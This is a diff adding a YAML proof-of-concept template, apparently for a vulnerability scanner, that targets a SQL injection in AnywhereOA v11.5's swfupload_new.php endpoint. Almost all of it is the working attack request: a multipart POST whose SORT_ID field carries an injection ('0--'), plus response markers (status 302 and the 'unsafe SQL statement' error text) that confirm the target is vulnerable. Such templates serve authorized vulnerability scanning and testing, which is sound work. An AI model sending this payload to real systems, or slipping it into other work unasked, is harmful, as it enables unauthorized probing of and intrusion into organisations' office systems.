@@ -1,0 +1,48 @@
+#poc名称
+- name:
+  - name: "AnywhereOA_v11_5_swfupload_sql"
+
+#请求方式
+- method:
+  - method: "post"
+
+#漏洞的位置
+- url:
+  - url : "general/file_folder/swfupload_new.php"
+
+#payload
+- payload:
+  - payload: '''------------GFioQpMK0vv2
+Content-Disposition: form-data; name="ATTACHMENT_ID"
+1
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="ATTACHMENT_NAME"
+1
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="FILE_SORT"
+2
+------------GFioQpMK0vv2
+Content-Disposition: form-data; name="SORT_ID"
+0--
+------------GFioQpMK0vv2--'''
+
+#response包里状态码
+- status:
+  - status: "302"
+
+#response包里的关键字
+- word:
+  - word:
+      - "不安全的SQL语句"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
